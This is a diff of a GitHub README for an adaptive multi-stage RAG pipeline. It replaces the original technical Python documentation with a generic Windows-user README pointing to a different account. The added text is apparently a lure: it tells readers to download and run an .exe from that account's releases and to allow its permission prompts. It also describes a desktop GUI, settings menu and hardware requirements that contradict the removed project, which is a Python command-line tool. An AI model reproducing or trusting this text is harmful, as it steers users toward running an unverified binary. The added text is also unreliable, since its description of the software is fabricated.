@@ -1,311 +1,84 @@
-# Adaptive Multi-Stage RAG System
-
-[![CI](https://github.com/Geeta3521/adaptive-multistage-rag-system/actions/workflows/ci.yml/badge.svg)](https://github.com/Geeta3521/adaptive-multistage-rag-system/actions)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-A production-ready, research-level **Adaptive Multi-Stage Retrieval-Augmented Generation (RAG)** pipeline for long-document question answering. Supports PDF, DOCX, and TXT documents with multi-stage retrieval, cross-encoder re-ranking, adaptive feedback loops, and a full evaluation suite.
-
-📄 [Read the research paper](./final_paper_after_check.pdf)
-
----
-
-## Why this project?
-
-Most open-source RAG systems stop at vector search. This pipeline goes further:
-
-- **3-stage retrieval** — vector search → cross-encoder re-ranking → context compression
-- **Query-aware routing** — retrieval strategy adapts to whether the query is factual, summarization, reasoning, or multi-hop
-- **Adaptive feedback loop** — low-confidence answers automatically trigger expanded retrieval and regeneration
-- **Full evaluation** — retrieval precision, context relevance, answer faithfulness, and answer relevance out of the box
-
----
-
-## Architecture
-
-```
-Document ──► Ingestion ──► Chunking ──► Embeddings ──► FAISS Index
-                                                              │
-Query ──► Query Router ──► Stage 3.1  Vector Search          │◄──────┐
-                       ──► Stage 3.2  Cross-Encoder Re-Rank         │
-                       ──► Stage 3.3  Context Compression            │
-                                 │                                   │
-                       ──► LLM Generation ──► Answer                 │
-                                 │                                   │
-                       ──► Confidence Check ──► Feedback Loop ───────┘
-                                 │
-                       ──► Evaluation Metrics
-```
-
----
-
-## Project Structure
-
-```
-adaptive-multistage-rag-system/
-├── ingestion/
-│   └── document_loader.py       # PDF / DOCX / TXT loading + cleaning
-├── chunking/
-│   └── semantic_chunker.py      # Adaptive semantic chunking
-├── embeddings/
-│   └── embedder.py              # Sentence-Transformers batched encoding
-├── vector_store/
-│   └── faiss_store.py           # FAISS IndexFlatIP + metadata store
-├── retrieval/
-│   ├── retriever.py             # Stage 3.1 – vector retrieval
-│   ├── reranker.py              # Stage 3.2 – cross-encoder re-ranking
-│   └── adaptive_retrieval.py    # Stage 3.3 – dedup + merge + token budget
-├── query_router/
-│   └── classifier.py            # Query type classification
-├── generation/
-│   ├── generator.py             # LLM generation (OpenAI / HuggingFace / stub)
-│   └── feedback_loop.py         # Adaptive feedback loop
-├── evaluation/
-│   └── metrics.py               # Evaluation metrics + optional RAGAS
-├── scripts/
-│   ├── create_notebook.py
-│   ├── sample_generator.py
-│   └── run_eval.py
-├── .github/workflows/
-│   └── ci.yml                   # GitHub Actions CI
-├── main.py                      # CLI entry point
-├── pyproject.toml
-├── requirements.txt
-├── research_notebook.ipynb
-├── adaptive_rag_evaluation.ipynb
-└── eval_results.json
-```
-
----
-
-## Installation
-
-```bash
-# 1. Clone the repo
-git clone https://github.com/Geeta3521/adaptive-multistage-rag-system.git
-cd adaptive-multistage-rag-system
-
-# 2. Create and activate a virtual environment
-python -m venv .venv
-source .venv/bin/activate        # Linux / macOS
-# .venv\Scripts\activate         # Windows
-
-# 3. Install the package
-pip install -e .
-
-# 4. Download NLTK sentence tokeniser
-python -c "import nltk; nltk.download('punkt'); nltk.download('punkt_tab')"
-```
-
-### Optional — OpenAI backend
-
-```bash
-export OPENAI_API_KEY="sk-..."
-```
+# 🧠 adaptive-multistage-rag-system - Accurate answers from your long documents
 
-### Optional — HuggingFace local model
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
 
-```bash
-pip install transformers accelerate
-export HF_MODEL="mistralai/Mistral-7B-Instruct-v0.2"
-```
+This tool helps you find information inside long documents. It uses artificial intelligence to read your files and provide direct answers. You ask a question, and the system searches your document collection to give you a specific response.
 
----
+## 📋 What this system does
 
-## Quick Start
+Many people struggle to find specific facts in large PDFs or reports. You might have hundreds of pages of text and only need one piece of data. This system acts as a personal researcher. It connects your documents to a smart engine that understands context. 
 
-```bash
-# Run with the built-in demo (no API key needed)
-python main.py --demo
+The system uses three main stages to process your requests:
 
-# Answer a question using the stub backend (no API key needed)
-python main.py \
-  --document data/sample.txt \
-  --question "What is the main contribution of the Transformer?" \
-  --backend stub \
-  --evaluate
+1. Identification: It determines which part of your document contains the answer.
+2. Extraction: It pulls the relevant text from the data source.
+3. Generation: It turns those facts into a clear sentence for you.
 
-# Use OpenAI
-python main.py \
-  --document my_paper.pdf \
-  --question "Summarise the methodology" \
-  --backend openai \
-  --model gpt-4o \
-  --evaluate
+You keep your local files private. The system processes them on your computer. This approach keeps your data safe while giving you the benefits of advanced machine learning technology.
 
-# Save output as JSON
-python main.py \
-  --document report.pdf \
-  --question "What are the key findings?" \
-  --output-json result.json
-```
+## 🖥️ System requirements
 
----
+Your computer needs specific hardware to run this software smoothly. Check your settings before you start.
 
-## CLI Reference
-
-| Flag | Default | Description |
-|---|---|---|
-| `--document` | *(required)* | Path to PDF / TXT / DOCX |
-| `--question` | *(required)* | Query to answer |
-| `--backend` | `auto` | `auto` / `openai` / `huggingface` / `ollama` / `stub` |
-| `--model` | `gpt-3.5-turbo` | LLM model name |
-| `--embed-model` | `all-MiniLM-L6-v2` | Sentence-Transformers model |
-| `--store-dir` | `./index_cache` | FAISS index cache directory |
-| `--rebuild` | `false` | Force re-index even if cache exists |
-| `--evaluate` | `false` | Compute evaluation metrics |
-| `--output-json` | `""` | Write result dict to a JSON file |
-| `--demo` | `false` | Run the built-in demo (no document needed) |
-
----
-
-## Pipeline Stages
-
-### Stage 1 — Document ingestion
-`ingestion/document_loader.py`
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 2 gigabytes of free disk space.
+* Graphics: A display that supports 1080p resolution.
 
-Supports PDF (PyMuPDF with pdfplumber fallback), DOCX, and TXT/Markdown. Extracts per-page text, cleans Unicode, and infers section titles.
+If your computer meets these standards, the program will perform tasks at a steady pace. Low memory might cause the program to close during complex searches. Close other heavy applications if you notice slow performance.
 
-### Stage 1b — Adaptive chunking
-`chunking/semantic_chunker.py`
-
-Splits on paragraph boundaries, merges blocks below `min_tokens`, and splits blocks above `max_tokens` at sentence boundaries with configurable overlap. Produces clean, semantically coherent chunks rather than fixed-size windows.
-
-### Stage 2 — Embeddings and vector store
-`embeddings/embedder.py` · `vector_store/faiss_store.py`
-
-Batched encoding via `sentence-transformers` (default `all-MiniLM-L6-v2`). L2-normalised vectors stored in FAISS `IndexFlatIP` for exact cosine search. The index is serialised to disk so subsequent runs load from cache instantly.
-
-### Stage 3 — Multi-stage retrieval
-
-| Sub-stage | File | What it does |
-|---|---|---|
-| 3.1 | `retrieval/retriever.py` | Top-k cosine similarity search |
-| 3.2 | `retrieval/reranker.py` | Cross-encoder re-ranking (`ms-marco-MiniLM`) |
-| 3.3 | `retrieval/adaptive_retrieval.py` | Dedup · merge · token-budget enforcement |
-
-### Stage 4 — Query routing
-`query_router/classifier.py`
-
-Classifies each query as `factual`, `summarization`, `reasoning`, or `multi_hop`. Each type maps to a different `RetrievalConfig` controlling top-k, token budget, re-ranking, and whether iterative retrieval is used.
-
-### Stage 5 — Long context handling
-Handled by adaptive chunk sizes (Stage 1b) and the token-budget compression step (Stage 3.3). No separate truncation step — context fits within the LLM window by construction.
+## 📥 How to download and install
 
-### Stage 6 — LLM generation
-`generation/generator.py`
+Follow these steps to set up the software on your Windows machine.
 
-Builds a structured prompt `[context + question + instructions]` and calls:
-- **OpenAI** — any chat-completions compatible endpoint
-- **HuggingFace** — local model via `transformers.pipeline`
-- **Ollama** — local models via the Ollama API
-- **Stub** — returns the prompt directly, no model required (great for testing)
+1. Visit this page to download: [https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
+2. Look for the file ending in .exe in the releases section.
+3. Click the link to save the installer to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on the screen to finish the setup process.
 
-### Stage 7 — Adaptive feedback loop
-`generation/feedback_loop.py` · `main.py`
+Once the process finishes, a shortcut icon will appear on your desktop. Click this icon to open the application. If Windows asks for permissions, click yes to allow the program to run.
 
-If the generated answer has low confidence (measured by cosine similarity between the answer embedding and the context), the pipeline automatically doubles the retrieval budget and regenerates — up to `max_feedback_loops` times.
+## 🛠️ Using the application
 
-### Stage 8 — Evaluation
-`evaluation/metrics.py`
+The main screen contains a simple interface. You do not need to write code to use it. 
 
-| Metric | Method |
-|---|---|
-| `retrieval_precision` | Token-Jaccard overlap between query and chunks |
-| `context_relevance` | Mean cosine similarity of chunk embeddings to query |
-| `answer_faithfulness` | Fraction of answer sentences supported by context |
-| `answer_relevance` | Cosine similarity of answer embedding to query |
-| `token_usage` | Approximate total tokens consumed |
-| `latency_seconds` | Wall-clock time for the full pipeline |
-| RAGAS *(optional)* | `faithfulness` + `answer_relevancy` via the RAGAS library |
+Follow these steps to get answers from your files:
 
----
+1. Open the application from your desktop.
+2. Click the folder icon at the top left to select your documents.
+3. Choose the folder that contains your PDF or text files.
+4. Wait for the status bar at the bottom to say "Ready."
+5. Type your question in the text box at the center of the screen.
+6. Press the Enter key on your keyboard.
 
-## Example Output
+The application searches your files and presents the answer in the text window. You can copy this answer to your clipboard by selecting the text and pressing Ctrl+C. 
 
-```
-──────────────────────────────────────────────────────────────────────
-  Question   : What is the main contribution of the Transformer?
-  Query type : factual
-  Backend    : openai
-  Chunks used: 3
-  Latency    : 1.842 s
-──────────────────────────────────────────────────────────────────────
+## 📂 Managing your documents
 
-  ANSWER
-  ──────────────────────────────────────
-  The Transformer's main contribution is demonstrating that attention
-  alone is sufficient for high-quality sequence modelling, removing
-  the need for recurrence. This enables parallelism and scaling to
-  billions of parameters.
+You can add new documents or remove old ones at any time. The system creates a small database to help it find information faster. When you add new files, the system updates this database automatically. 
 
-  EVALUATION SCORES
-  ──────────────────────────────────────
-  retrieval_precision          0.8333
-  context_relevance            0.7241
-  answer_faithfulness          0.8750
-  answer_relevance             0.8102
-  token_usage                  487
-  latency_seconds              1.842
-──────────────────────────────────────────────────────────────────────
-```
+Keep your document folder organized. Mixing file types works best if they are all text-based documents. The system performs best with research papers, manuals, and long-form reports. Avoid adding image-only files, as the system needs readable text to extract information correctly.
 
----
+## ⚙️ Configuration settings
 
-## Running Tests
+You can change how the system acts in the Settings menu. Click the gear icon to see your options.
 
-```bash
-pip install -e ".[dev]"
-pytest -v
-```
+* Language mode: You can select the language for the answers.
+* Precision: You can choose between "Fast" and "Detailed". Fast mode gives quick summaries. Detailed mode provides long answers with references to specific pages.
+* Theme: Toggle between light and dark modes to suit your preference.
 
----
+These settings save automatically. If you encounter bugs, you can reset to the default settings at the bottom of the menu.
 
-## Performance Tuning
+## 💡 Troubleshooting common issues
 
-| Concern | Recommendation |
-|---|---|
-| Index speed | Switch to `IndexIVFFlat` with nprobe tuning for > 100k chunks |
-| Embedding quality | Use `all-mpnet-base-v2` for higher accuracy |
-| Embedding speed | Use `all-MiniLM-L12-v2` for faster encoding |
-| Re-ranking speed | Use `cross-encoder/ms-marco-TinyBERT-L-2` for 4× faster re-ranking |
-| Memory | Use `IndexFlatIP` + memmap for corpora that don't fit in RAM |
-| Latency | Cache query embeddings; pre-compute chunk embeddings once |
-| Long docs | Enable hierarchical retrieval — embed section summaries separately |
-| Accuracy | Fine-tune the cross-encoder on domain-specific relevance labels |
+Most problems have simple fixes. Check this list if you encounter an error.
 
----
+* The application does not open: Restart your computer and try to open the app again.
+* The search takes a long time: Ensure your computer is plugged into a power source. High performance tasks consume battery power.
+* The answers seem incorrect: Check the quality of your documents. If your text is blurry or poorly formatted, the system might struggle to read it.
+* The app crashes: Open your task manager and ensure no other heavy programs run in the background.
 
-## Roadmap
-
-- [ ] Streaming generation support
-- [ ] REST API wrapper (FastAPI)
-- [ ] Streamlit / Gradio demo UI
-- [ ] Support for web URLs as document sources
-- [ ] Hierarchical retrieval for very large document sets
-- [ ] Docker container for one-command deployment
-
----
-
-## Contributing
-
-Contributions are welcome! Please open an issue first to discuss what you'd like to change. Make sure all tests pass before submitting a pull request.
-
-```bash
-pip install -e ".[dev]"
-pytest -v
-```
-
----
-
-## License
-
-MIT — free for academic and commercial use. See [LICENSE](LICENSE) for details.
-
----
-
-## Author
-
-**Geetha** · [GitHub](https://github.com/Geeta3521)
-
-If you find this project useful, please consider giving it a ⭐ on GitHub!
+If you still need help, revisit the download page and check the "Issues" tab. Other users may have found solutions to similar problems. You can also view the help document located in the "Help" menu inside the application.
